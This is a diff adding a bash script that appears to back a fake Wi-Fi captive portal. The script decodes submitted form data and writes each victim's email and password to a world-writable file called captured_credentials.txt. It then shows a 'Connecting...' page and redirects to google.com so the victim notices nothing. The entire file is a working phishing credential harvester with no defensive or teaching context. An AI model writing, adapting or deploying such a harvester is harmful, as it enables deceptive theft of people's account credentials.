@@ -1,0 +1,47 @@
+#!/usr/bin/env bash
+# --- Configuration ---
+LOG_FILE="/home/kali/Desktop/captured_credentials.txt"
+REDIRECT_URL="https://google.com"
+WAIT_SECONDS="4"
+
+
+touch "${LOG_FILE}"  
+chmod 666 "${LOG_FILE}" 
+
+#  Decode POST Data 
+POST_DATA=$(cat /dev/stdin)
+DECODED_DATA=$(printf '%b' "${POST_DATA//%/\\x}")
+
+
+# Extract Email and Password
+EMAIL=$(echo "${DECODED_DATA}" | grep -oP 'email=[^&]*' | cut -d'=' -f2)
+PASSWORD=$(echo "${DECODED_DATA}" | grep -oP 'password=[^&]*' | cut -d'=' -f2)
+
+# Save Credentials 
+if [[ -n "${EMAIL}" ]] && [[ -n "${PASSWORD}" ]]; then
+    echo "[+] Captured Credentials on $(date):" >> "${LOG_FILE}"
+    echo "    Email: ${EMAIL}" >> "${LOG_FILE}"
+    echo "    Password: ${PASSWORD}" >> "${LOG_FILE}"
+    echo "----------------------------------------" >> "${LOG_FILE}"
+fi
+
+# --- Generate Success Page for the User ---
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e "\t\t<meta http-equiv=\"refresh\" content=\"${WAIT_SECONDS}; url=${REDIRECT_URL}\" />"
+echo -e '\t\t<title>Connecting...</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="background-image"></div>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t<h1>Connecting</h1>'
+
+echo -e '\t\t\t<div class="loader"></div>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+exit 0
+
